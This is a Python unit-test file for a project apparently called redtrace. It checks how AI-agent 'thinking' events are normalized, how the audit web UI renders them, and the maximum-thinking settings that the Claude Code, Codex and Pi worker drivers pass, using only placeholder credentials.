def test_pi_thinking_end_without_deltas_keeps_full_text() -> None:
    events = normalize_event(
        "pi",
        json.dumps(
            {
                "type": "message_update",
                "assistantMessageEvent": {
                    "type": "thinking_end",
                    "content": "完整思考内容",
                },
            },
            ensure_ascii=False,
        ),
    )

    assert len(events) == 1
    assert events[0]["kind"] == "thinking.message"
    assert events[0]["content"] == "完整思考内容"
    assert not events[0].get("persist_only")


def test_static_audit_renders_thinking_cards() -> None:
    static_dir = Path(__file__).parents[1] / "src" / "redtrace" / "server" / "static"
    index = (static_dir / "index.html").read_text(encoding="utf-8")
    audit = (static_dir / "audit.js").read_text(encoding="utf-8")
    styles = (static_dir / "audit.css").read_text(encoding="utf-8")
    theme = (static_dir / "redtrace-theme.css").read_text(encoding="utf-8")

    assert "isThinking(event)" in index
    assert '<details class="audit-thinking">' in index
    assert "深度思考" in index
    assert "isThinking(event)" in audit
    assert "'thinking.message': '思考'" in audit
    assert "'thinking.delta': '思考'" in audit
    assert ".audit-thinking" in styles
    assert ".audit-thinking" in theme
    assert "/static/audit.js?v=20260808-thinking-collapse" in index


def test_worker_drivers_run_at_maximum_thinking_strength() -> None:
    from redtrace.dispatcher.workers.adapters.claudecode import (
        CLAUDE_MAX_THINKING_TOKENS,
        ClaudeCodeDriver,
    )
    from redtrace.dispatcher.workers.adapters.codex import CodexDriver
    from redtrace.dispatcher.workers.adapters.pi import PiDriver

    claude_worker = WorkerConfig.model_validate(
        {
            "name": "claude-1",
            "type": "claudecode",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {
                "ANTHROPIC_MODEL": "model",
                "ANTHROPIC_BASE_URL": "http://api",
                "ANTHROPIC_AUTH_TOKEN": "secret",
            },
        }
    )
    # Claude thinking is injected into the process environment, not argv.
    assert CLAUDE_MAX_THINKING_TOKENS == "31999"
    claude_argv = ClaudeCodeDriver().build_execute(claude_worker, "prompt", "session").argv
    assert "MAX_THINKING_TOKENS" not in claude_argv

    codex_worker = claude_worker.model_copy(
        update={
            "name": "codex-1",
            "type": "codex",
            "env": {
                "CODEX_MODEL": "model",
                "CODEX_BASE_URL": "http://api",
                "OPENAI_API_KEY": "secret",
            },
        }
    )
    for argv in (
        CodexDriver().build_execute(codex_worker, "prompt", None).argv,
        CodexDriver().build_conclude(codex_worker, "prompt", "thread-1").argv,
    ):
        assert 'model_reasoning_effort="high"' in argv
        assert 'model_reasoning_summary="always"' in argv

    pi_worker = claude_worker.model_copy(
        update={
            "name": "pi-1",
            "type": "pi",
            "env": {
                "PI_MODEL": "model",
                "PI_BASE_URL": "http://api",
                "PI_API_KEY": "secret",
                "PI_PROVIDER_API": "openai-completions",
            },
        }
    )
    for argv in (
        PiDriver().build_execute(pi_worker, "prompt", None).argv,
        PiDriver().build_conclude(pi_worker, "prompt", "session-1").argv,
        PiDriver(local=True)._local_argv(pi_worker, "prompt", None),
    ):
        assert argv[argv.index("--thinking") + 1] == "max"

    overridden = pi_worker.model_copy(
        update={"env": {**pi_worker.env, "REDTRACE_PI_THINKING_LEVEL": "high"}}
    )
    argv = PiDriver().build_execute(overridden, "prompt", None).argv
    assert argv[argv.index("--thinking") + 1] == "high"
